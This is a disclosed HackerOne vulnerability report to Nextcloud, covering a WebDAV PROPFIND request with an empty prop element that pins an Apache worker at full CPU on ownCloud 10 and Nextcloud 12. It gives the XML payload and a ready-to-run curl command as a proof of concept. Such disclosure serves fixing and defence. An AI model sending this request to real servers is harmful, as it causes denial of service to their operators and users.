# WebDAV Empty Property search leads to full CPU usage

## Report Details
- **Report ID**: 255822
- **URL**: https://hackerone.com/reports/255822
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-08-02T14:53:24.064Z
- **Disclosed**: 2020-03-01T14:08:49.772Z

## Reporter
- **Username**: julzify
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
Tested with the following versions:
 - [owncloud:10.0](https://hub.docker.com/_/owncloud/)
 - [nextcloud:12.0](https://hub.docker.com/_/nextcloud/)

with mariadb in place.

A `PROFIND nextcloud/remote.php/webdav/` with

```xml
<?xml version="1.0"?>
<a:propfind xmlns:a="DAV:">
<a:prop></a:prop>
</a:propfind>
```
as body causes full CPU utilization of one Apache worker process.

in curl form:
```
curl -i --user testuser:testpass -X PROPFIND -d '<?xml version="1.0"?><a:propfind xmlns:a="DAV:"><a:prop></a:prop></a:propfind>' http://nextcloud/remote.php/webdav
```


## Attachments
No attachments
